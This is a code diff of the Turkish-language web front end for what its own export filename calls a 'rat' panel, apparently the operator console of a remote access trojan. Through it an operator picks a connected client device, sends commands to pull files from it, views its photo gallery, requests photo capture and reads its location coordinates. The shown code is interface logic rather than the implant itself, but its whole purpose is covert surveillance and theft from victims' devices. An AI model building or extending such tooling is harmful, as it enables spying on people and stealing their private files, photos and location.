+                            <div class="file-info">
+                                <span class="file-name">${fileName}</span>
+                                <span class="file-size">${fileSize}</span>
+                            </div>
+                            <span class="file-type">${fileType}</span>
+                            <button class="btn btn-mini" onclick="downloadFile('${file.path}')">⬇️</button>
+                         </div>`;
+            });
+
+            html += `       </div>
+                        </div>
+                     </div>`;
+        } else if (type === 'download' && data.file_data) {
+            html += `<div class="result-summary">
+                        <span class="result-icon">⬇️</span>
+                        <span>Dosya indirildi: ${data.filename}</span>
+                     </div>`;
+            html += `<div class="result-details">
+                        <div class="download-info">
+                            <p><strong>📄 Dosya Adı:</strong> ${data.filename}</p>
+                            <p><strong>📏 Boyut:</strong> ${Math.round(data.file_data.length * 0.75 / 1024)} KB</p>
+                            <button class="btn btn-success" onclick="downloadToDevice('${data.filename}', '${data.file_data}')">💾 Bilgisayara İndir</button>
+                        </div>
+                     </div>`;
+        } else if (type === 'photo' && data.error) {
+            html += `<div class="result-summary">
+                        <span class="result-icon">📷</span>
+                        <span>Fotoğraf çekme yanıtı</span>
+                     </div>`;
+            html += `<div class="result-details">
+                        <div class="photo-error">
+                            <p><strong>❌ Bilgi:</strong> ${data.error}</p>
+                            <p><strong>💡 Öneri:</strong> ${data.suggestion || 'Galeri fotoğraflarını görüntülemek için "Galeri Göster" butonunu kullanın'}</p>
+                        </div>
+                     </div>`;
+        } else if (type === 'gallery' && data.photos) {
+            const photoCount = data.photos.length;
+            html += `<div class="result-summary">
+                        <span class="result-icon">🖼️</span>
+                        <span>${photoCount} fotoğraf bulundu</span>
+                     </div>`;
+            html += `<div class="result-details">
+                        <div class="gallery-container">
+                            <div class="gallery-stats">
+                                <p><strong>📊 Toplam Fotoğraf:</strong> ${photoCount}</p>
+                                <p><strong>ℹ️ Not:</strong> Son 5 fotoğraf gösteriliyor</p>
+                            </div>
+                            <div class="gallery-grid">`;
+
+            data.photos.forEach((photo, index) => {
+                const fileSize = Math.round(photo.data.length * 0.75 / 1024);
+                const dateAdded = new Date(photo.date_added * 1000).toLocaleString();
+
+                html += `<div class="gallery-item">
+                            <div class="gallery-image">
+                                <img src="data:image/jpeg;base64,${photo.data}" alt="${photo.name}" onclick="openImageModal(this)">
+                            </div>
+                            <div class="gallery-info">
+                                <p class="photo-name">${photo.name}</p>
+                                <p class="photo-size">${fileSize} KB</p>
+                                <p class="photo-date">${dateAdded}</p>
+                                <div class="photo-actions">
+                                    <button class="btn btn-mini" onclick="downloadPhotoToDevice('${photo.name}', '${photo.data}')">💾 İndir</button>
+                                    <button class="btn btn-mini" onclick="copyPhotoInfo('${photo.name}', '${photo.path}')">📋 Bilgi</button>
+                                </div>
+                            </div>
+                         </div>`;
+            });
+
+            html += `       </div>
+                        </div>
+                     </div>`;
+        } else {
+            html += `<div class="result-summary">
+                        <span class="result-icon">💬</span>
+                        <span>${data.message || 'Komut yanıtı'}</span>
+                     </div>`;
+            html += `<div class="result-details">
+                        <div class="json-container">
+                            <pre class="json-content">${JSON.stringify(data, null, 2)}</pre>
+                        </div>
+                     </div>`;
         }
 
-        function exportResults() {
-            const results = document.getElementById('results-content').innerHTML;
-            const blob = new Blob([results], { type: 'text/html' });
+        html += `</div>`;
+
+        if (resultsContent.innerHTML.includes('no-results')) {
+            resultsContent.innerHTML = html;
+        } else {
+            resultsContent.innerHTML = html + resultsContent.innerHTML;
+        }
+    }
+
+    function toggleDetails(button) {
+        const resultItem = button.closest('.result-item');
+        const details = resultItem.querySelector('.result-details');
+
+        if (details.style.display === 'none' || !details.style.display) {
+            details.style.display = 'block';
+            button.innerHTML = '👁️ Gizle';
+            button.classList.add('active');
+        } else {
+            details.style.display = 'none';
+            button.innerHTML = '👁️ Detaylar';
+            button.classList.remove('active');
+        }
+    }
+
+    function getFileIcon(filename) {
+        const ext = filename.split('.').pop().toLowerCase();
+        const icons = {
+            'jpg': '🖼️', 'jpeg': '🖼️', 'png': '🖼️', 'gif': '🖼️',
+            'mp4': '🎬', 'avi': '🎬', 'mov': '🎬',
+            'mp3': '🎵', 'wav': '🎵', 'flac': '🎵',
+            'pdf': '📄', 'doc': '📄', 'docx': '📄',
+            'txt': '📝', 'log': '📝',
+            'apk': '📦', 'zip': '📦', 'rar': '📦',
+            'exe': '⚙️', 'msi': '⚙️'
+        };
+        return icons[ext] || '📄';
+    }
+
+    function getFileType(filename) {
+        const ext = filename.split('.').pop().toLowerCase();
+        const types = {
+            'jpg': 'Görsel', 'jpeg': 'Görsel', 'png': 'Görsel', 'gif': 'Görsel',
+            'mp4': 'Video', 'avi': 'Video', 'mov': 'Video',
+            'mp3': 'Ses', 'wav': 'Ses', 'flac': 'Ses',
+            'pdf': 'Belge', 'doc': 'Belge', 'docx': 'Belge',
+            'txt': 'Metin', 'log': 'Log',
+            'apk': 'Uygulama', 'zip': 'Arşiv', 'rar': 'Arşiv'
+        };
+        return types[ext] || 'Dosya';
+    }
+
+    function formatFileSize(bytes) {
+        if (bytes === 0) return '0 B';
+        const k = 1024;
+        const sizes = ['B', 'KB', 'MB', 'GB'];
+        const i = Math.floor(Math.log(bytes) / Math.log(k));
+        return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
+    }
+
+    function searchFiles(input, listId) {
+        const searchTerm = input.value.toLowerCase();
+        const filesList = document.getElementById('files-list-' + listId);
+        const items = filesList.querySelectorAll('.file-item');
+
+        items.forEach(item => {
+            const fileName = item.querySelector('.file-name').textContent.toLowerCase();
+            if (fileName.includes(searchTerm)) {
+                item.style.display = 'flex';
+            } else {
+                item.style.display = 'none';
+            }
+        });
+    }
+
+    function copyCoordinates(lat, lon) {
+        navigator.clipboard.writeText(`${lat}, ${lon}`);
+        alert('Koordinatlar kopyalandı!');
+    }
+
+    function openInMaps(lat, lon) {
+        window.open(`https://www.google.com/maps?q=${lat},${lon}`, '_blank');
+    }
+
+    function openImageModal(img) {
+        const modal = document.createElement('div');
+        modal.className = 'image-modal';
+        modal.innerHTML = `
+            <div class="modal-content">
+                <span class="close" onclick="this.parentElement.parentElement.remove()">&times;</span>
+                <img src="${img.src}" alt="Screenshot" class="modal-image">
+            </div>
+        `;
+        document.body.appendChild(modal);
+    }
+
+    function downloadFile(filename) {
+        const clientId = getSelectedClient();
+        if (!clientId) return;
+
+        fetch('/send_command', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                client_id: clientId,
+                command: 'download_file',
+                filepath: filename
+            })
+        })
+        .then(response => response.json())
+        .then(data => {
+            showResult('command', { message: `"${filename}" dosyası indiriliyor...` });
+        });
+    }
+
+    function clearResults() {
+        if (confirm('Tüm sonuçları temizlemek istediğinizden emin misiniz?')) {
+            document.getElementById('results-content').innerHTML = '<p class="no-results">Henüz komut çalıştırılmadı</p>';
+        }
+    }
+
+    function exportResults() {
+        const results = document.getElementById('results-content').innerHTML;
+        const blob = new Blob([results], { type: 'text/html' });
+        const url = URL.createObjectURL(blob);
+        const a = document.createElement('a');
+        a.href = url;
+        a.download = `rat_results_${new Date().toISOString().split('T')[0]}.html`;
+        a.click();
+        URL.revokeObjectURL(url);
+    }
+
+    function downloadToDevice(filename, fileData) {
+        try {
+            const byteCharacters = atob(fileData);
+            const byteNumbers = new Array(byteCharacters.length);
+            for (let i = 0; i < byteCharacters.length; i++) {
+                byteNumbers[i] = byteCharacters.charCodeAt(i);
+            }
+            const byteArray = new Uint8Array(byteNumbers);
+            const blob = new Blob([byteArray]);
+
             const url = URL.createObjectURL(blob);
             const a = document.createElement('a');
             a.href = url;
-            a.download = `rat_results_${new Date().toISOString().split('T')[0]}.html`;
+            a.download = filename;
             a.click();
             URL.revokeObjectURL(url);
+        } catch (error) {
+            console.error('Download error:', error);
+            alert('Dosya indirilirken hata oluştu');
         }
+    }
 
-        function downloadToDevice(filename, fileData) {
-            try {
-                const byteCharacters = atob(fileData);
-                const byteNumbers = new Array(byteCharacters.length);
-                for (let i = 0; i < byteCharacters.length; i++) {
-                    byteNumbers[i] = byteCharacters.charCodeAt(i);
-                }
-                const byteArray = new Uint8Array(byteNumbers);
-                const blob = new Blob([byteArray]);
-                
-                const url = URL.createObjectURL(blob);
-                const a = document.createElement('a');
-                a.href = url;
-                a.download = filename;
-                a.click();
-                URL.revokeObjectURL(url);
-            } catch (error) {
-                console.error('Download error:', error);
-                alert('Dosya indirilirken hata oluştu');
+    function downloadPhotoToDevice(filename, imageData) {
+        try {
+            const byteCharacters = atob(imageData);
+            const byteNumbers = new Array(byteCharacters.length);
+            for (let i = 0; i < byteCharacters.length; i++) {
+                byteNumbers[i] = byteCharacters.charCodeAt(i);
             }
-        }
+            const byteArray = new Uint8Array(byteNumbers);
+            const blob = new Blob([byteArray], { type: 'image/jpeg' });
 
-        function downloadPhotoToDevice(filename, imageData) {
-            try {
-                const byteCharacters = atob(imageData);
-                const byteNumbers = new Array(byteCharacters.length);
-                for (let i = 0; i < byteCharacters.length; i++) {
-                    byteNumbers[i] = byteCharacters.charCodeAt(i);
-                }
-                const byteArray = new Uint8Array(byteNumbers);
-                const blob = new Blob([byteArray], { type: 'image/jpeg' });
-                
-                const url = URL.createObjectURL(blob);
-                const a = document.createElement('a');
-                a.href = url;
-                a.download = filename;
-                a.click();
-                URL.revokeObjectURL(url);
-            } catch (error) {
-                console.error('Photo download error:', error);
-                alert('Fotoğraf indirilirken hata oluştu');
-            }
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = filename;
+            a.click();
+            URL.revokeObjectURL(url);
+        } catch (error) {
+            console.error('Photo download error:', error);
+            alert('Fotoğraf indirilirken hata oluştu');
         }
+    }
 
-        function copyPhotoInfo(name, path) {
-            const info = `Fotoğraf Adı: ${name}\nDosya Yolu: ${path}`;
-            navigator.clipboard.writeText(info).then(() => {
-                alert('Fotoğraf bilgileri kopyalandı!');
-            }).catch(err => {
-                console.error('Copy error:', err);
-                alert('Kopyalama sırasında hata oluştu');
-            });
-        }
-
-        // Sayfa yüklendiğinde cihazları yenile
-        setInterval(refreshClients, 15000); // 15 saniye
-        refreshClients();
-        
-        // Sayfa yenilendiğinde de cihazları yenile
-        window.addEventListener('beforeunload', function() {
-            refreshClients();
+    function copyPhotoInfo(name, path) {
+        const info = `Fotoğraf Adı: ${name}\nDosya Yolu: ${path}`;
+        navigator.clipboard.writeText(info).then(() => {
+            alert('Fotoğraf bilgileri kopyalandı!');
+        }).catch(err => {
+            console.error('Copy error:', err);
+            alert('Kopyalama sırasında hata oluştu');
         });
-    </script>
+    }
+
+    // Sayfa yüklendiğinde cihazları yenile
+    setInterval(refreshClients, 15000); // 15 saniye
+    refreshClients();
+
+    // Sayfa yenilendiğinde de cihazları yenile
+    window.addEventListener('beforeunload', function() {
+        refreshClients();
+    });
+</script>
 </body>
 </html>
